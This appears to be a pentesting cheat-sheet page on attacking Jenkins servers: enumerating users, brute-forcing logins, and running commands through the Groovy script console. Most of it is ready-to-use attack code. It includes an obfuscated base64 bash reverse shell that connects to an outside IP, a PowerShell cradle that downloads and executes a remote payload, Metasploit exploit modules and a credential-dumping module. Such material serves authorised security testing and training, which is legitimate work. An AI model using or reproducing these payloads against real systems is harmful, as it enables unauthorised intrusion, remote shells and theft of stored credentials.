# Jenkins

## Enumeration

Searching for interesting Jenkins pages without authentication like _`/people`_ or _`/asynchPeople`_ (this lists the current users) you can use:

```
msf> use auxiliary/scanner/http/jenkins_enum
```

Check if you can execute commands without needing authentication:

```
msf> use auxiliary/scanner/http/jenkins_command
```

Without credentials you can look inside _**/asynchPeople/**_ path or _**/securityRealm/user/admin/search/index?q=**_ for **usernames**.

You may be able to get the Jenkins version from the path _**/oops**_ or _**/error**_

![](../../web-app-pentesting/80-443/broken-reference)

Using cURL

```bash
curl -v <target-IP>
```

![](<../../.gitbook/assets/image (61) (1).png>)

Or from intercepting traffic with Burp Suite

![](<../../.gitbook/assets/image (22) (1) (1).png>)

## Login

You will be able to find Jenkins instances that **allow you to create an account and login inside of it. As simple as that.**\
\*\*\*\*Also if **SSO** **functionality**/**plugins** were present then you should attempt to **log-in** to the application using a test account (i.e., a test **Github/Bitbucket account**). Trick from [**here**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jekins** does **not** implement any **password policy** or username **brute-force mitigation**. Then, you **should** always try to **brute-force** users because probably **weak passwords** are being used (even **usernames as passwords** or **reverse** usernames as passwords).

```bash
msf> use auxiliary/scanner/http/jenkins_login
```

## Known Vulnerabilities

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Code Execution

### **Execute Groovy script**

Best way. Less noisy.

1. Go to _path\_jenkins/script_
2. Inside the text box introduce the script

```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```

You could execute a command using: `cmd.exe /c dir`

In **Linux** you can do: **`"ls /".execute().text`**

If you need to use _quotes_ and _single quotes_ inside the text. You can use _"""PAYLOAD"""_ (triple double quotes) to execute the payload.

**Another useful groovy script** is (replace \[INSERT COMMAND]):

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse Shell in Linux

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse Shell in Windows

You can prepare a HTTP server with a PS reverse shell and use Jeking to download and execute it:

```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://[IP_ADDRESS]:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```

### MSF Exploit

You can use MSF to get a reverse shell:

```
msf> use exploit/multi/http/jenkins_script_console
```

## Post Exploitation

Dump Jenkins credentials using:

```
msf> post/multi/gather/jenkins_gather
```

## References

{% embed url="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit" %}

{% embed url="https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password" %}
